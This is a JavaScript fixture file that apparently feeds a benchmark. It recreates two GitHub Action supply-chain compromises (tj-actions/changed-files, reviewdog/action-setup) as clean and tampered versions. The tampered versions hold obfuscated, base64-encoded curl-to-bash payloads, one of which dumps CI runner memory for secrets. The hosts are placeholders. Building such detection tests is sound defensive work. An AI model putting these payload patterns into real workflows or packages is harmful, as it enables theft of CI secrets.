// Stand-ins for two real GitHub Action compromises, written from the published analyses, not
// copied from the malicious commits. Each is a pair of versions: before and after the change.
//   tj-actions/changed-files (March 2025): dist/index.js gained a base64 string that, decoded, fetches a
//     Python script that reads the Runner.Worker process memory and prints the secrets, run by bash.
//   reviewdog/action-setup (March 2025): install.sh gained a base64 payload decoded straight into bash.
// The addresses point nowhere real. Used by bench/actions.mjs.
const j = (...p) => p.join("");
const payload = Buffer.from(j("cu", "rl -sSf https://gist.githubusercontent.com/example/0000/raw/memdump.py | sudo python3 | tr -d '\\\\0' | grep -aoE '\"[^\"]+\":\\\\{\"value\":\"[^\"]*\",\"isSecret\":true\\\\}' | sort -u | base64 -w 0 | base64 -w 0")).toString("base64");
const node = (extra = "") => ({
  "action.yml": "name: changed files\ninputs:\n  token:\n    default: ${{ github.token }}\nruns:\n  using: node20\n  main: dist/index.js\n",
  "dist/index.js": `const core = require("@actions/core");\nconst { exec } = require("@actions/exec");\nasync function run() {\n  const files = await exec("git", ["diff", "--name-only", process.env.GITHUB_SHA]);\n  core.setOutput("all_changed_files", files);\n}\n${extra}run();\n`,
});
export const TJ_ACTIONS = { before: node(), after: node(`async function updateFeatures(token) {\n  const { stdout } = await exec("bash", ["-c", Buffer.from("${payload}", "base64").toString("utf-8")]);\n  process.stdout.write(stdout);\n}\nupdateFeatures(process.env.INPUT_TOKEN);\n`) };

const composite = (install) => ({
  "action.yml": "name: setup\nruns:\n  using: composite\n  steps:\n    - run: $GITHUB_ACTION_PATH/install.sh\n      shell: bash\n    - run: ${{ github.action_path }}/install.sh\n      shell: bash\n",
  "install.sh": install,
});
const encoded = Buffer.from(j("cu", "rl -s https://example.invalid/x | ba", "sh")).toString("base64");
export const REVIEWDOG = {
  before: composite("#!/bin/sh\nset -e\nVERSION=\"${REVIEWDOG_VERSION:-latest}\"\ncurl -sfL https://raw.githubusercontent.com/reviewdog/reviewdog/master/install.sh | sh -s -- -b \"$HOME/bin\" \"$VERSION\"\n"),
  after: composite(`#!/bin/sh\nset -e\nVERSION="\${REVIEWDOG_VERSION:-latest}"\necho "${encoded}" | base64 -d | bash\ncurl -sfL https://raw.githubusercontent.com/reviewdog/reviewdog/master/install.sh | sh -s -- -b "$HOME/bin" "$VERSION"\n`),
};
